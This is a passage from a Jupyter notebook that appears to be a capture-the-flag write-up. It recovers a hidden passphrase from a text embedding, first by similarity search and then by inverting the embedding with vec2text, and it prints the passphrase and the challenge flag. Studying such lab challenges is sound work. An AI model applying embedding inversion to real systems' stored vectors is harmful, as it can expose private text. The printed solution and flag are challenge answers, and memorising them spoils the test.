    "D,I = gen_comparison()\n",
    "results = [(initial_phrases[i],D[0][x]) for x,i in enumerate(I[0])]\n",
    "print(results)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So we have very close matches for 'a secret passphrase'. We can refine this a little bit:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('the secret passphrase', 0.7018439), ('secret passphrase', 0.6966969), ('The secret passphrase', 0.6962642), ('a secret passphrase', 0.69480723), ('Secret passphrase', 0.6894336)]\n"
     ]
    }
   ],
   "source": [
    "phrases = ['a secret passphrase', 'the secret passphrase', 'my secret passphrase', 'secret passphrase']\n",
    "phrases = [x.capitalize() for x in phrases] + phrases\n",
    "gen_embedings(phrases)\n",
    "D,I = gen_comparison()\n",
    "results = [(phrases[i],D[0][x]) for x,i in enumerate(I[0])]\n",
    "print(results)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Alright, we have an even closer match for 'the secret passphrase'. We need to refine it further. I asked GPT to generate a list of potential phrases. But it was way too resource intensive and caused a lot of crashes lol. I didn't solve this challenge during the CTF, so I'm going to use the official writeup for this part.\n",
    "\n",
    "I don't have a GPU so I had to modify it slightly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Loading checkpoint shards: 100%|██████████| 8/8 [00:01<00:00,  7.62it/s]\n",
      "Loading checkpoint shards: 100%|██████████| 6/6 [00:00<00:00, 17.54it/s]\n"
     ]
    }
   ],
   "source": [
    "import vec2text\n",
    "\n",
    "\n",
    "gtr_embeddings = np.load(file_path)\n",
    "embedding = torch.from_numpy(gtr_embeddings).float()  # Convert to PyTorch tensor\n",
    "\n",
    "device = torch.device(\"mps\" if torch.backends.mps.is_available() else \"cpu\")\n",
    "embedding = embedding.to(device)\n",
    "\n",
    "corrector = vec2text.load_pretrained_corrector(\"gtr-base\")\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['           The secret passphrase is: terminalinit']\n"
     ]
    }
   ],
   "source": [
    "reconstructed_text = vec2text.invert_embeddings(\n",
    "    embeddings=embedding,\n",
    "    corrector=corrector,\n",
    "    num_steps=20,  # More steps = better accuracy (but slower)\n",
    "    sequence_beam_width=4,  # Wider beam = better results (but more memory)\n",
    ")\n",
    "\n",
    "print(reconstructed_text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we found the password, we can connect to the server and send it to get the flag:\n",
    "\n",
    "\n",
    "<img src=\"Reverse Prompt/flag.png\" alt=\"flag\" width=\"500\">\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**The Flag Is**: `HTB{AI_S3cr3ts_Unve1l3d}`"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ml-env",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
